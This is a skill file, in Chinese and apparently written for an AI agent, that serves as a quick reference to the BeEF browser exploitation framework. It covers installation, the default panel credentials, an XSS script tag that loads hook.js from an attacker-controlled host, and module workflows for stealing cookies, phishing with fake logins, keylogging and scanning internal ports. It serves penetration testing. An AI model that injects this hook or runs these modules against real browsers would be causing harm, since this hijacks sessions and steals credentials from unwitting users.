---
name: beef
description: >
  此技能适用于用户询问关于 "beef"、"在目标上已有 XSS 漏洞，需要转向浏览器端攻击、会话劫持和社会工程学" 等内容。浏览器漏洞利用框架 (Browser Exploitation Framework) — 通过 XSS/注入 JS 挂钩浏览器并执行客户端攻击。
---

# BeEF (Browser Exploitation Framework)

通过 XSS 挂钩浏览器，并从 Web 控制台执行客户端攻击。

## 快速开始

```bash
# Kali
beef-xss

# Or from source
git clone https://github.com/beefproject/beef
cd beef && ./install && ./beef

# Panel: http://127.0.0.1:3000/ui/panel
# Default creds: beef/beef
# Hook URL: http://YOUR_IP:3000/hook.js
```

## 注入 Hook

```html
<!-- Inject in XSS payload or MITM response -->
<script src="http://YOUR_IP:3000/hook.js"></script>
```

## 主要模块类别

| 类别 | 示例 |
|----------|---------|
| 网络 (Network) | 端口扫描、Ping 扫描、SSRF |
| 浏览器 (Browser) | 指纹识别、剪贴板窃取、摄像头访问 |
| 社会工程学 (Social Engineering) | 伪造登录、伪造更新、点击劫持 |
| 漏洞利用 (Exploits) | 浏览器 CVE、Java 漏洞 |
| 持久化 (Persistence) | 通过 Service Worker 实现持久 Hook |
| 其他 (Misc) | 键盘记录、截图、地理定位 |

## 常见工作流程

**通过已挂钩的浏览器窃取 Cookie：**
```
Modules > Browser > Hooked Domain > Get Cookie
```

**通过伪造登录覆层进行钓鱼：**
```
Modules > Social Engineering > Pretty Theft
```

**从浏览器扫描内网端口：**
```
Modules > Network > Port Scanner
# Set targets: 192.168.1.1-254
```

## 资源

| 文件 | 加载时机 |
|------|--------------|
| `references/` | 模块列表与 Hook 持久化技术 |
